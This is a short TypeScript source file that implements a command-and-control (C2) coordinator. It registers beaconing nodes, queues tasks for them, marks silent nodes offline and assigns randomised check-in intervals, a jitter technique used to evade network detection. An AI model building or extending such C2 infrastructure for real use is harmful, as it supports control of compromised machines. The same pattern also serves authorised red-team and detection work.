import { ethers } from 'ethers';
import { EventEmitter } from 'events';

// C2 Node Representation
interface C2Node {
  id: string;
  address: string;
  lastSeen: number;
  status: 'idle' | 'tasked' | 'offline';
  capabilities: string[];
}

interface JitterConfig {
  baseInterval: number; // ms
  jitterFactor: number; // 0.0 to 1.0
}

class C2Coordinator extends EventEmitter {
  private nodes: Map<string, C2Node> = new Map();
  private tasks: Map<string, any[]> = new Map();
  private jitterConfig: JitterConfig = {
    baseInterval: 30000, // 30 seconds
    jitterFactor: 0.2,   // 20% variance
  };

  constructor() {
    super();
    console.log('[C2] Coordinator initialized.');
  }

  // Register or update a node via beacon
  registerBeacon(nodeId: string, address: string, capabilities: string[]) {
    const node: C2Node = {
      id: nodeId,
      address,
      capabilities,
      lastSeen: Date.now(),
      status: this.nodes.get(nodeId)?.status || 'idle',
    };
    
    this.nodes.set(nodeId, node);
    this.emit('beacon', node);
    
    // Check for tasks
    const pendingTasks = this.tasks.get(nodeId) || [];
    this.tasks.delete(nodeId);
    
    // Calculate next jittered interval
    const jitter = (Math.random() - 0.5) * 2 * (this.jitterConfig.baseInterval * this.jitterConfig.jitterFactor);
    const nextInterval = this.jitterConfig.baseInterval + jitter;

    return {
      status: 'acknowledged',
      tasks: pendingTasks,
      nextCheckIn: Math.floor(nextInterval),
    };
  }

  assignTask(nodeId: string, task: any) {
    if (!this.tasks.has(nodeId)) {
      this.tasks.set(nodeId, []);
    }
    this.tasks.get(nodeId)?.push(task);
  }

  getNodes() {
    return Array.from(this.nodes.values());
  }

  // Monitor for offline nodes
  checkHealth() {
    const now = Date.now();
    this.nodes.forEach((node, id) => {
      if (now - node.lastSeen > (this.jitterConfig.baseInterval * 3)) {
        node.status = 'offline';
        this.emit('node_offline', node);
      }
    });
  }
}

export const coordinator = new C2Coordinator();

// Periodically check health
setInterval(() => coordinator.checkHealth(), 10000);
